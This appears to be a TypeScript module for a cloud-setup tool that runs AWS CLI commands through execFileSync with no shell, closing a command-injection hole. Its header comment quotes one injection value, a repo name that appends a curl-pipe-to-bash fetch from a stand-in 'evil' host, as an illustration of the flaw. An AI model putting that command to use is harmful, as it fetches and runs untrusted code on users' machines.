/**
 * Shell-free command execution for the bootstrapper commands.
 *
 * Why this module exists:
 *
 * The setup commands prompt for values (GitHub org, repo name, GitLab project
 * path) and then build AWS CLI invocations from them. The original helpers
 * interpolated those values into a command *string* and handed it to
 * execSync, which spawns a shell -- `/bin/bash` in setup-github-oidc, `/bin/sh`
 * by default everywhere else. Either way the prompt answer is parsed as shell
 * source, so a repo name of `x; curl evil.sh | bash` executes.
 *
 * There was a second, quieter hole in the same call sites. The IAM trust and
 * inline policy documents were embedded as `--policy-document '${json}'`,
 * relying on single quotes to protect a JSON blob that itself contains the
 * prompt answers. A single apostrophe in an org name terminates that quoted
 * region early and everything after it becomes shell syntax. Shell-quoting a
 * value that is interpolated into a larger quoted string is a losing game:
 * the escaping has to be correct at every nesting level, forever.
 *
 * Passing argv directly removes the shell from the picture entirely, so there
 * is no metacharacter layer left to escape. That also means JSON documents
 * need no outer quoting -- each is exactly one argv element, however many
 * spaces, quotes, or newlines it contains.
 *
 * Consequence for callers: there is no shell, so shell features do not work.
 * No pipes, globs, `&&`, redirection, or `$VAR` expansion. Anything that
 * needs those must be expressed in TypeScript instead -- which is the point,
 * since each of those was also an injection vector.
 */

import { execFileSync } from 'node:child_process';

export interface RunResult {
  ok: boolean;
  stdout: string;
  stderr: string;
}

/**
 * Runs `file` with `args` and no shell.
 *
 * Each element of `args` is passed to the process verbatim, so callers must
 * split their own arguments -- `run('aws', ['iam', 'get-role', '--role-name',
 * name])`, never `run('aws', ['iam get-role --role-name ' + name])`. The
 * latter would arrive as a single argument and the command would fail, which
 * is a loud failure rather than a silent injection.
 *
 * `extraEnv` is merged over the inherited environment. It exists so a caller
 * can hand a child process temporary STS credentials without writing them to
 * disk or mutating this process's own environment -- the latter would leak the
 * assumed role into every later call in the same run.
 *
 * A key mapped to `undefined` is REMOVED rather than set. Blanking is not
 * equivalent: `AWS_PROFILE=''` makes the AWS CLI look for a profile literally
 * named `()` and fail with "The config profile () could not be found", so
 * injected credentials are ignored and every call errors. Measured, not
 * theoretical.
 *
 * Never throws: a non-zero exit, a missing binary, and a signal kill all come
 * back as `ok: false`. Callers branch on `ok` and surface `stderr`.
 */
export function run(file: string, args: string[], extraEnv?: Record<string, string | undefined>): RunResult {
  let env: NodeJS.ProcessEnv = process.env;
  if (extraEnv) {
    env = { ...process.env };
    for (const [k, v] of Object.entries(extraEnv)) {
      if (v === undefined) delete env[k];
      else env[k] = v;
    }
  }
  try {
    const stdout = execFileSync(file, args, {
      encoding: 'utf8',
      stdio: ['pipe', 'pipe', 'pipe'],
      env,
    }).trim();
    return { ok: true, stdout, stderr: '' };
  } catch (err: any) {
    return { ok: false, stdout: '', stderr: (err.stderr || err.message || '').trim() };
  }
}

/**
 * Like run(), but inherits stdio so the child can drive the terminal.
 *
 * Needed for `codeburn sync setup`, which opens a browser and prints an OIDC
 * prompt the user has to see and answer. Returns whether the child exited 0.
 */
export function runInteractive(file: string, args: string[]): boolean {
  try {
    execFileSync(file, args, { stdio: 'inherit', env: process.env });
    return true;
  } catch {
    return false;
  }
}
